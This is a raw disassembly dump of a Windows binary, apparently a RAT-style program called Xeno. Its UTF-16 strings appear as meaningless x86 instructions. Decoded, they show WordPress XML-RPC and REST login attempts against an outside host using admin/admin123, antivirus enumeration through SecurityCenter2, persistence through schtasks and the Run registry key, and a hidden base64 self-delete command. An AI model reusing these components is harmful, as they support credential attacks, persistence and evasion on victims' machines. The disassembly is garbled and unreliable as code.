  40ba1d:	00 6c 00 72          	add    %ch,0x72(%eax,%eax,1)
  40ba21:	00 70 00             	add    %dh,0x0(%eax)
  40ba24:	63 00                	arpl   %eax,(%eax)
  40ba26:	2e 00 70 00          	add    %dh,%cs:0x0(%eax)
  40ba2a:	68 00 70 00 01       	push   $0x1007000
  40ba2f:	81 a7 3c 00 3f 00 78 	andl   $0x6d0078,0x3f003c(%edi)
  40ba36:	00 6d 00 
  40ba39:	6c                   	insb   (%dx),%es:(%edi)
  40ba3a:	00 20                	add    %ah,(%eax)
  40ba3c:	00 76 00             	add    %dh,0x0(%esi)
  40ba3f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba43:	73 00                	jae    0x40ba45
  40ba45:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40ba4b:	3d 00 22 00 31       	cmp    $0x31002200,%eax
  40ba50:	00 2e                	add    %ch,(%esi)
  40ba52:	00 30                	add    %dh,(%eax)
  40ba54:	00 22                	add    %ah,(%edx)
  40ba56:	00 3f                	add    %bh,(%edi)
  40ba58:	00 3e                	add    %bh,(%esi)
  40ba5a:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40ba5d:	6d                   	insl   (%dx),%es:(%edi)
  40ba5e:	00 65 00             	add    %ah,0x0(%ebp)
  40ba61:	74 00                	je     0x40ba63
  40ba63:	68 00 6f 00 64       	push   $0x64006f00
  40ba68:	00 43 00             	add    %al,0x0(%ebx)
  40ba6b:	61                   	popa
  40ba6c:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40ba70:	00 3e                	add    %bh,(%esi)
  40ba72:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40ba75:	6d                   	insl   (%dx),%es:(%edi)
  40ba76:	00 65 00             	add    %ah,0x0(%ebp)
  40ba79:	74 00                	je     0x40ba7b
  40ba7b:	68 00 6f 00 64       	push   $0x64006f00
  40ba80:	00 4e 00             	add    %cl,0x0(%esi)
  40ba83:	61                   	popa
  40ba84:	00 6d 00             	add    %ch,0x0(%ebp)
  40ba87:	65 00 3e             	add    %bh,%gs:(%esi)
  40ba8a:	00 77 00             	add    %dh,0x0(%edi)
  40ba8d:	70 00                	jo     0x40ba8f
  40ba8f:	2e 00 67 00          	add    %ah,%cs:0x0(%edi)
  40ba93:	65 00 74 00 55       	add    %dh,%gs:0x55(%eax,%eax,1)
  40ba98:	00 73 00             	add    %dh,0x0(%ebx)
  40ba9b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40ba9f:	73 00                	jae    0x40baa1
  40baa1:	42                   	inc    %edx
  40baa2:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40baa6:	00 67 00             	add    %ah,0x0(%edi)
  40baa9:	73 00                	jae    0x40baab
  40baab:	3c 00                	cmp    $0x0,%al
  40baad:	2f                   	das
  40baae:	00 6d 00             	add    %ch,0x0(%ebp)
  40bab1:	65 00 74 00 68       	add    %dh,%gs:0x68(%eax,%eax,1)
  40bab6:	00 6f 00             	add    %ch,0x0(%edi)
  40bab9:	64 00 4e 00          	add    %cl,%fs:0x0(%esi)
  40babd:	61                   	popa
  40babe:	00 6d 00             	add    %ch,0x0(%ebp)
  40bac1:	65 00 3e             	add    %bh,%gs:(%esi)
  40bac4:	00 3c 00             	add    %bh,(%eax,%eax,1)
  40bac7:	70 00                	jo     0x40bac9
  40bac9:	61                   	popa
  40baca:	00 72 00             	add    %dh,0x0(%edx)
  40bacd:	61                   	popa
  40bace:	00 6d 00             	add    %ch,0x0(%ebp)
  40bad1:	73 00                	jae    0x40bad3
  40bad3:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40bad7:	70 00                	jo     0x40bad9
  40bad9:	61                   	popa
  40bada:	00 72 00             	add    %dh,0x0(%edx)
  40badd:	61                   	popa
  40bade:	00 6d 00             	add    %ch,0x0(%ebp)
  40bae1:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40bae5:	76 00                	jbe    0x40bae7
  40bae7:	61                   	popa
  40bae8:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40baec:	00 65 00             	add    %ah,0x0(%ebp)
  40baef:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40baf3:	73 00                	jae    0x40baf5
  40baf5:	74 00                	je     0x40baf7
  40baf7:	72 00                	jb     0x40baf9
  40baf9:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40baff:	3e 00 61 00          	add    %ah,%ds:0x0(%ecx)
  40bb03:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40bb07:	69 00 6e 00 3c 00    	imul   $0x3c006e,(%eax),%eax
  40bb0d:	2f                   	das
  40bb0e:	00 73 00             	add    %dh,0x0(%ebx)
  40bb11:	74 00                	je     0x40bb13
  40bb13:	72 00                	jb     0x40bb15
  40bb15:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40bb1b:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40bb1f:	2f                   	das
  40bb20:	00 76 00             	add    %dh,0x0(%esi)
  40bb23:	61                   	popa
  40bb24:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bb28:	00 65 00             	add    %ah,0x0(%ebp)
  40bb2b:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40bb2f:	2f                   	das
  40bb30:	00 70 00             	add    %dh,0x0(%eax)
  40bb33:	61                   	popa
  40bb34:	00 72 00             	add    %dh,0x0(%edx)
  40bb37:	61                   	popa
  40bb38:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb3b:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40bb3f:	70 00                	jo     0x40bb41
  40bb41:	61                   	popa
  40bb42:	00 72 00             	add    %dh,0x0(%edx)
  40bb45:	61                   	popa
  40bb46:	00 6d 00             	add    %ch,0x0(%ebp)
  40bb49:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40bb4d:	76 00                	jbe    0x40bb4f
  40bb4f:	61                   	popa
  40bb50:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bb54:	00 65 00             	add    %ah,0x0(%ebp)
  40bb57:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40bb5b:	73 00                	jae    0x40bb5d
  40bb5d:	74 00                	je     0x40bb5f
  40bb5f:	72 00                	jb     0x40bb61
  40bb61:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40bb67:	3e 00 61 00          	add    %ah,%ds:0x0(%ecx)
  40bb6b:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40bb6f:	69 00 6e 00 31 00    	imul   $0x31006e,(%eax),%eax
  40bb75:	32 00                	xor    (%eax),%al
  40bb77:	33 00                	xor    (%eax),%eax
  40bb79:	3c 00                	cmp    $0x0,%al
  40bb7b:	2f                   	das
  40bb7c:	00 73 00             	add    %dh,0x0(%ebx)
  40bb7f:	74 00                	je     0x40bb81
  40bb81:	72 00                	jb     0x40bb83
  40bb83:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40bb89:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40bb8d:	2f                   	das
  40bb8e:	00 76 00             	add    %dh,0x0(%esi)
  40bb91:	61                   	popa
  40bb92:	00 6c 00 75          	add    %ch,0x75(%eax,%eax,1)
  40bb96:	00 65 00             	add    %ah,0x0(%ebp)
  40bb99:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40bb9d:	2f                   	das
  40bb9e:	00 70 00             	add    %dh,0x0(%eax)
  40bba1:	61                   	popa
  40bba2:	00 72 00             	add    %dh,0x0(%edx)
  40bba5:	61                   	popa
  40bba6:	00 6d 00             	add    %ch,0x0(%ebp)
  40bba9:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40bbad:	2f                   	das
  40bbae:	00 70 00             	add    %dh,0x0(%eax)
  40bbb1:	61                   	popa
  40bbb2:	00 72 00             	add    %dh,0x0(%edx)
  40bbb5:	61                   	popa
  40bbb6:	00 6d 00             	add    %ch,0x0(%ebp)
  40bbb9:	73 00                	jae    0x40bbbb
  40bbbb:	3e 00 3c 00          	add    %bh,%ds:(%eax,%eax,1)
  40bbbf:	2f                   	das
  40bbc0:	00 6d 00             	add    %ch,0x0(%ebp)
  40bbc3:	65 00 74 00 68       	add    %dh,%gs:0x68(%eax,%eax,1)
  40bbc8:	00 6f 00             	add    %ch,0x0(%edi)
  40bbcb:	64 00 43 00          	add    %al,%fs:0x0(%ebx)
  40bbcf:	61                   	popa
  40bbd0:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bbd4:	00 3e                	add    %bh,(%esi)
  40bbd6:	00 00                	add    %al,(%eax)
  40bbd8:	59                   	pop    %ecx
  40bbd9:	68 00 74 00 74       	push   $0x74007400
  40bbde:	00 70 00             	add    %dh,0x0(%eax)
  40bbe1:	73 00                	jae    0x40bbe3
  40bbe3:	3a 00                	cmp    (%eax),%al
  40bbe5:	2f                   	das
  40bbe6:	00 2f                	add    %ch,(%edi)
  40bbe8:	00 78 00             	add    %bh,0x0(%eax)
  40bbeb:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbec:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40bbf2:	00 75 00             	add    %dh,0x0(%ebp)
  40bbf5:	74 00                	je     0x40bbf7
  40bbf7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbf8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bbfb:	61                   	popa
  40bbfc:	00 2e                	add    %ch,(%esi)
  40bbfe:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40bc02:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40bc06:	00 79 00             	add    %bh,0x0(%ecx)
  40bc09:	2f                   	das
  40bc0a:	00 77 00             	add    %dh,0x0(%edi)
  40bc0d:	70 00                	jo     0x40bc0f
  40bc0f:	2d 00 6a 00 73       	sub    $0x73006a00,%eax
  40bc14:	00 6f 00             	add    %ch,0x0(%edi)
  40bc17:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc18:	00 2f                	add    %ch,(%edi)
  40bc1a:	00 77 00             	add    %dh,0x0(%edi)
  40bc1d:	70 00                	jo     0x40bc1f
  40bc1f:	2f                   	das
  40bc20:	00 76 00             	add    %dh,0x0(%esi)
  40bc23:	32 00                	xor    (%eax),%al
  40bc25:	2f                   	das
  40bc26:	00 75 00             	add    %dh,0x0(%ebp)
  40bc29:	73 00                	jae    0x40bc2b
  40bc2b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc2f:	73 00                	jae    0x40bc31
  40bc31:	01 55 7b             	add    %edx,0x7b(%ebp)
  40bc34:	00 22                	add    %ah,(%edx)
  40bc36:	00 75 00             	add    %dh,0x0(%ebp)
  40bc39:	73 00                	jae    0x40bc3b
  40bc3b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bc3f:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc40:	00 61 00             	add    %ah,0x0(%ecx)
  40bc43:	6d                   	insl   (%dx),%es:(%edi)
  40bc44:	00 65 00             	add    %ah,0x0(%ebp)
  40bc47:	22 00                	and    (%eax),%al
  40bc49:	3a 00                	cmp    (%eax),%al
  40bc4b:	22 00                	and    (%eax),%al
  40bc4d:	61                   	popa
  40bc4e:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40bc52:	00 69 00             	add    %ch,0x0(%ecx)
  40bc55:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc56:	00 22                	add    %ah,(%edx)
  40bc58:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40bc5b:	22 00                	and    (%eax),%al
  40bc5d:	70 00                	jo     0x40bc5f
  40bc5f:	61                   	popa
  40bc60:	00 73 00             	add    %dh,0x0(%ebx)
  40bc63:	73 00                	jae    0x40bc65
  40bc65:	77 00                	ja     0x40bc67
  40bc67:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc68:	00 72 00             	add    %dh,0x0(%edx)
  40bc6b:	64 00 22             	add    %ah,%fs:(%edx)
  40bc6e:	00 3a                	add    %bh,(%edx)
  40bc70:	00 22                	add    %ah,(%edx)
  40bc72:	00 61 00             	add    %ah,0x0(%ecx)
  40bc75:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40bc79:	69 00 6e 00 31 00    	imul   $0x31006e,(%eax),%eax
  40bc7f:	32 00                	xor    (%eax),%al
  40bc81:	33 00                	xor    (%eax),%eax
  40bc83:	22 00                	and    (%eax),%al
  40bc85:	7d 00                	jge    0x40bc87
  40bc87:	00 21                	add    %ah,(%ecx)
  40bc89:	78 00                	js     0x40bc8b
  40bc8b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc8c:	00 2d 00 2d 00 65    	add    %ch,0x65002d00
  40bc92:	00 75 00             	add    %dh,0x0(%ebp)
  40bc95:	74 00                	je     0x40bc97
  40bc97:	6e                   	outsb  %ds:(%esi),(%dx)
  40bc98:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bc9b:	61                   	popa
  40bc9c:	00 2e                	add    %ch,(%esi)
  40bc9e:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  40bca2:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40bca6:	00 79 00             	add    %bh,0x0(%ecx)
  40bca9:	01 1d 45 00 64 00    	add    %ebx,0x640045
  40bcaf:	5f                   	pop    %edi
  40bcb0:	00 72 00             	add    %dh,0x0(%edx)
  40bcb3:	61                   	popa
  40bcb4:	00 74 00 5f          	add    %dh,0x5f(%eax,%eax,1)
  40bcb8:	00 6e 00             	add    %ch,0x0(%esi)
  40bcbb:	64 00 39             	add    %bh,%fs:(%ecx)
  40bcbe:	00 39                	add    %bh,(%ecx)
  40bcc0:	00 39                	add    %bh,(%ecx)
  40bcc2:	00 39                	add    %bh,(%ecx)
  40bcc4:	00 76 00             	add    %dh,0x0(%esi)
  40bcc7:	00 15 6e 00 6f 00    	add    %dl,0x6f006e
  40bccd:	74 00                	je     0x40bccf
  40bccf:	68 00 69 00 6e       	push   $0x6e006900
  40bcd4:	00 67 00             	add    %ah,0x0(%edi)
  40bcd7:	73 00                	jae    0x40bcd9
  40bcd9:	65 00 74 00 00       	add    %dh,%gs:0x0(%eax,%eax,1)
  40bcde:	0d 2d 00 61 00       	or     $0x61002d,%eax
  40bce3:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40bce7:	69 00 6e 00 01 03    	imul   $0x301006e,(%eax),%eax
  40bced:	25 00 00 1d 25       	and    $0x251d0000,%eax
  40bcf2:	00 5c 00 58          	add    %bl,0x58(%eax,%eax,1)
  40bcf6:	00 65 00             	add    %ah,0x0(%ebp)
  40bcf9:	6e                   	outsb  %ds:(%esi),(%dx)
  40bcfa:	00 6f 00             	add    %ch,0x0(%edi)
  40bcfd:	4d                   	dec    %ebp
  40bcfe:	00 61 00             	add    %ah,0x0(%ecx)
  40bd01:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd02:	00 61 00             	add    %ah,0x0(%ecx)
  40bd05:	67 00 65 00          	add    %ah,0x0(%di)
  40bd09:	72 00                	jb     0x40bd0b
  40bd0b:	5c                   	pop    %esp
  40bd0c:	00 00                	add    %al,(%eax)
  40bd0e:	23 58 00             	and    0x0(%eax),%ebx
  40bd11:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40bd15:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd16:	00 55 00             	add    %dl,0x0(%ebp)
  40bd19:	70 00                	jo     0x40bd1b
  40bd1b:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bd1f:	74 00                	je     0x40bd21
  40bd21:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40bd25:	61                   	popa
  40bd26:	00 6e 00             	add    %ch,0x0(%esi)
  40bd29:	61                   	popa
  40bd2a:	00 67 00             	add    %ah,0x0(%edi)
  40bd2d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bd31:	00 01                	add    %al,(%ecx)
  40bd33:	00 07                	add    %al,(%edi)
  40bd35:	20 00                	and    %al,(%eax)
  40bd37:	2d 00 20 00 01       	sub    $0x1002000,%eax
  40bd3c:	05 5c 00 5c 00       	add    $0x5c005c,%eax
  40bd41:	00 2b                	add    %ch,(%ebx)
  40bd43:	5c                   	pop    %esp
  40bd44:	00 72 00             	add    %dh,0x0(%edx)
  40bd47:	6f                   	outsl  %ds:(%esi),(%dx)
  40bd48:	00 6f 00             	add    %ch,0x0(%edi)
  40bd4b:	74 00                	je     0x40bd4d
  40bd4d:	5c                   	pop    %esp
  40bd4e:	00 53 00             	add    %dl,0x0(%ebx)
  40bd51:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bd55:	75 00                	jne    0x40bd57
  40bd57:	72 00                	jb     0x40bd59
  40bd59:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bd5f:	43                   	inc    %ebx
  40bd60:	00 65 00             	add    %ah,0x0(%ebp)
  40bd63:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd64:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bd68:	00 72 00             	add    %dh,0x0(%edx)
  40bd6b:	32 00                	xor    (%eax),%al
  40bd6d:	00 3d 53 00 45 00    	add    %bh,0x450053
  40bd73:	4c                   	dec    %esp
  40bd74:	00 45 00             	add    %al,0x0(%ebp)
  40bd77:	43                   	inc    %ebx
  40bd78:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bd7c:	00 2a                	add    %ch,(%edx)
  40bd7e:	00 20                	add    %ah,(%eax)
  40bd80:	00 46 00             	add    %al,0x0(%esi)
  40bd83:	52                   	push   %edx
  40bd84:	00 4f 00             	add    %cl,0x0(%edi)
  40bd87:	4d                   	dec    %ebp
  40bd88:	00 20                	add    %ah,(%eax)
  40bd8a:	00 41 00             	add    %al,0x0(%ecx)
  40bd8d:	6e                   	outsb  %ds:(%esi),(%dx)
  40bd8e:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40bd92:	00 76 00             	add    %dh,0x0(%esi)
  40bd95:	69 00 72 00 75 00    	imul   $0x750072,(%eax),%eax
  40bd9b:	73 00                	jae    0x40bd9d
  40bd9d:	50                   	push   %eax
  40bd9e:	00 72 00             	add    %dh,0x0(%edx)
  40bda1:	6f                   	outsl  %ds:(%esi),(%dx)
  40bda2:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bda6:	00 63 00             	add    %ah,0x0(%ebx)
  40bda9:	74 00                	je     0x40bdab
  40bdab:	00 17                	add    %dl,(%edi)
  40bdad:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bdb1:	73 00                	jae    0x40bdb3
  40bdb3:	70 00                	jo     0x40bdb5
  40bdb5:	6c                   	insb   (%dx),%es:(%edi)
  40bdb6:	00 61 00             	add    %ah,0x0(%ecx)
  40bdb9:	79 00                	jns    0x40bdbb
  40bdbb:	4e                   	dec    %esi
  40bdbc:	00 61 00             	add    %ah,0x0(%ecx)
  40bdbf:	6d                   	insl   (%dx),%es:(%edi)
  40bdc0:	00 65 00             	add    %ah,0x0(%ebp)
  40bdc3:	00 07                	add    %al,(%edi)
  40bdc5:	4e                   	dec    %esi
  40bdc6:	00 2f                	add    %ch,(%edi)
  40bdc8:	00 41 00             	add    %al,0x0(%ecx)
  40bdcb:	00 05 2c 00 20 00    	add    %al,0x20002c
  40bdd1:	00 47 53             	add    %al,0x53(%edi)
  40bdd4:	00 45 00             	add    %al,0x0(%ebp)
  40bdd7:	4c                   	dec    %esp
  40bdd8:	00 45 00             	add    %al,0x0(%ebp)
  40bddb:	43                   	inc    %ebx
  40bddc:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40bde0:	00 2a                	add    %ch,(%edx)
  40bde2:	00 20                	add    %ah,(%eax)
  40bde4:	00 46 00             	add    %al,0x0(%esi)
  40bde7:	52                   	push   %edx
  40bde8:	00 4f 00             	add    %cl,0x0(%edi)
  40bdeb:	4d                   	dec    %ebp
  40bdec:	00 20                	add    %ah,(%eax)
  40bdee:	00 57 00             	add    %dl,0x0(%edi)
  40bdf1:	69 00 6e 00 33 00    	imul   $0x33006e,(%eax),%eax
  40bdf7:	32 00                	xor    (%eax),%al
  40bdf9:	5f                   	pop    %edi
  40bdfa:	00 4f 00             	add    %cl,0x0(%edi)
  40bdfd:	70 00                	jo     0x40bdff
  40bdff:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40be03:	61                   	popa
  40be04:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40be08:	00 6e 00             	add    %ch,0x0(%esi)
  40be0b:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40be0f:	79 00                	jns    0x40be11
  40be11:	73 00                	jae    0x40be13
  40be13:	74 00                	je     0x40be15
  40be15:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40be19:	00 0f                	add    %cl,(%edi)
  40be1b:	43                   	inc    %ebx
  40be1c:	00 61 00             	add    %ah,0x0(%ecx)
  40be1f:	70 00                	jo     0x40be21
  40be21:	74 00                	je     0x40be23
  40be23:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40be29:	00 1d 4f 00 53 00    	add    %bl,0x53004f
  40be2f:	41                   	inc    %ecx
  40be30:	00 72 00             	add    %dh,0x0(%edx)
  40be33:	63 00                	arpl   %eax,(%eax)
  40be35:	68 00 69 00 74       	push   $0x74006900
  40be3a:	00 65 00             	add    %ah,0x0(%ebp)
  40be3d:	63 00                	arpl   %eax,(%eax)
  40be3f:	74 00                	je     0x40be41
  40be41:	75 00                	jne    0x40be43
  40be43:	72 00                	jb     0x40be45
  40be45:	65 00 00             	add    %al,%gs:(%eax)
  40be48:	0f 55 00             	andnps (%eax),%xmm0
  40be4b:	4e                   	dec    %esi
  40be4c:	00 4b 00             	add    %cl,0x0(%ebx)
  40be4f:	4e                   	dec    %esi
  40be50:	00 4f 00             	add    %cl,0x0(%edi)
  40be53:	57                   	push   %edi
  40be54:	00 4e 00             	add    %cl,0x0(%esi)
  40be57:	00 05 78 00 32 00    	add    %al,0x320078
  40be5d:	00 19                	add    %bl,(%ecx)
  40be5f:	73 00                	jae    0x40be61
  40be61:	63 00                	arpl   %eax,(%eax)
  40be63:	68 00 74 00 61       	push   $0x61007400
  40be68:	00 73 00             	add    %dh,0x0(%ebx)
  40be6b:	6b 00 73             	imul   $0x73,(%eax),%eax
  40be6e:	00 2e                	add    %ch,(%esi)
  40be70:	00 65 00             	add    %ah,0x0(%ebp)
  40be73:	78 00                	js     0x40be75
  40be75:	65 00 00             	add    %al,%gs:(%eax)
  40be78:	23 2f                	and    (%edi),%ebp
  40be7a:	00 71 00             	add    %dh,0x0(%ecx)
  40be7d:	75 00                	jne    0x40be7f
  40be7f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40be83:	79 00                	jns    0x40be85
  40be85:	20 00                	and    %al,(%eax)
  40be87:	2f                   	das
  40be88:	00 76 00             	add    %dh,0x0(%esi)
  40be8b:	20 00                	and    %al,(%eax)
  40be8d:	2f                   	das
  40be8e:	00 66 00             	add    %ah,0x0(%esi)
  40be91:	6f                   	outsl  %ds:(%esi),(%dx)
  40be92:	00 20                	add    %ah,(%eax)
  40be94:	00 63 00             	add    %ah,0x0(%ebx)
  40be97:	73 00                	jae    0x40be99
  40be99:	76 00                	jbe    0x40be9b
  40be9b:	00 03                	add    %al,(%ebx)
  40be9d:	22 00                	and    (%eax),%al
  40be9f:	00 11                	add    %dl,(%ecx)
  40bea1:	54                   	push   %esp
  40bea2:	00 61 00             	add    %ah,0x0(%ecx)
  40bea5:	73 00                	jae    0x40bea7
  40bea7:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40beaa:	00 61 00             	add    %ah,0x0(%ecx)
  40bead:	6d                   	insl   (%dx),%es:(%edi)
  40beae:	00 65 00             	add    %ah,0x0(%ebp)
  40beb1:	00 17                	add    %dl,(%edi)
  40beb3:	54                   	push   %esp
  40beb4:	00 61 00             	add    %ah,0x0(%ecx)
  40beb7:	73 00                	jae    0x40beb9
  40beb9:	6b 00 20             	imul   $0x20,(%eax),%eax
  40bebc:	00 54 00 6f          	add    %dl,0x6f(%eax,%eax,1)
  40bec0:	00 20                	add    %ah,(%eax)
  40bec2:	00 52 00             	add    %dl,0x0(%edx)
  40bec5:	75 00                	jne    0x40bec7
  40bec7:	6e                   	outsb  %ds:(%esi),(%dx)
  40bec8:	00 00                	add    %al,(%eax)
  40beca:	07                   	pop    %es
  40becb:	22 00                	and    (%eax),%al
  40becd:	2c 00                	sub    $0x0,%al
  40becf:	22 00                	and    (%eax),%al
  40bed1:	00 1b                	add    %bl,(%ebx)
  40bed3:	2f                   	das
  40bed4:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40bed8:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40bedc:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bee0:	00 20                	add    %ah,(%eax)
  40bee2:	00 2f                	add    %ch,(%edi)
  40bee4:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40bee8:	00 20                	add    %ah,(%eax)
  40beea:	00 22                	add    %ah,(%edx)
  40beec:	00 00                	add    %al,(%eax)
  40beee:	09 22                	or     %esp,(%edx)
  40bef0:	00 20                	add    %ah,(%eax)
  40bef2:	00 2f                	add    %ch,(%edi)
  40bef4:	00 66 00             	add    %ah,0x0(%esi)
  40bef7:	00 5b 53             	add    %bl,0x53(%ebx)
  40befa:	00 4f 00             	add    %cl,0x0(%edi)
  40befd:	46                   	inc    %esi
  40befe:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40bf02:	00 41 00             	add    %al,0x0(%ecx)
  40bf05:	52                   	push   %edx
  40bf06:	00 45 00             	add    %al,0x0(%ebp)
  40bf09:	5c                   	pop    %esp
  40bf0a:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf0d:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40bf13:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf14:	00 73 00             	add    %dh,0x0(%ebx)
  40bf17:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf18:	00 66 00             	add    %ah,0x0(%esi)
  40bf1b:	74 00                	je     0x40bf1d
  40bf1d:	5c                   	pop    %esp
  40bf1e:	00 57 00             	add    %dl,0x0(%edi)
  40bf21:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40bf27:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf28:	00 77 00             	add    %dh,0x0(%edi)
  40bf2b:	73 00                	jae    0x40bf2d
  40bf2d:	5c                   	pop    %esp
  40bf2e:	00 43 00             	add    %al,0x0(%ebx)
  40bf31:	75 00                	jne    0x40bf33
  40bf33:	72 00                	jb     0x40bf35
  40bf35:	72 00                	jb     0x40bf37
  40bf37:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40bf3b:	74 00                	je     0x40bf3d
  40bf3d:	56                   	push   %esi
  40bf3e:	00 65 00             	add    %ah,0x0(%ebp)
  40bf41:	72 00                	jb     0x40bf43
  40bf43:	73 00                	jae    0x40bf45
  40bf45:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bf4b:	5c                   	pop    %esp
  40bf4c:	00 52 00             	add    %dl,0x0(%edx)
  40bf4f:	75 00                	jne    0x40bf51
  40bf51:	6e                   	outsb  %ds:(%esi),(%dx)
  40bf52:	00 00                	add    %al,(%eax)
  40bf54:	61                   	popa
  40bf55:	4c                   	dec    %esp
  40bf56:	00 30                	add    %dh,(%eax)
  40bf58:	00 4d 00             	add    %cl,0x0(%ebp)
  40bf5b:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40bf5f:	32 00                	xor    (%eax),%al
  40bf61:	68 00 76 00 61       	push   $0x61007600
  40bf66:	00 57 00             	add    %dl,0x0(%edi)
  40bf69:	4e                   	dec    %esi
  40bf6a:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40bf6e:	00 43 00             	add    %al,0x0(%ebx)
  40bf71:	39 00                	cmp    %eax,(%eax)
  40bf73:	44                   	inc    %esp
  40bf74:	00 49 00             	add    %cl,0x0(%ecx)
  40bf77:	46                   	inc    %esi
  40bf78:	00 6b 00             	add    %ch,0x0(%ebx)
  40bf7b:	67 00 4c 00          	add    %cl,0x0(%si)
  40bf7f:	30 00                	xor    %al,(%eax)
  40bf81:	34 00                	xor    $0x0,%al
  40bf83:	67 00 4c 00          	add    %cl,0x0(%si)
  40bf87:	30 00                	xor    %al,(%eax)
  40bf89:	51                   	push   %ecx
  40bf8a:	00 67 00             	add    %ah,0x0(%edi)
  40bf8d:	57                   	push   %edi
  40bf8e:	00 53 00             	add    %dl,0x0(%ebx)
  40bf91:	41                   	inc    %ecx
  40bf92:	00 76 00             	add    %dh,0x0(%esi)
  40bf95:	56                   	push   %esi
  40bf96:	00 43 00             	add    %al,0x0(%ebx)
  40bf99:	41                   	inc    %ecx
  40bf9a:	00 7a 00             	add    %bh,0x0(%edx)
  40bf9d:	49                   	dec    %ecx
  40bf9e:	00 43 00             	add    %al,0x0(%ebx)
  40bfa1:	59                   	pop    %ecx
  40bfa2:	00 67 00             	add    %ah,0x0(%edi)
  40bfa5:	52                   	push   %edx
  40bfa6:	00 47 00             	add    %al,0x0(%edi)
  40bfa9:	56                   	push   %esi
  40bfaa:	00 73 00             	add    %dh,0x0(%ebx)
  40bfad:	49                   	dec    %ecx
  40bfae:	00 43 00             	add    %al,0x0(%ebx)
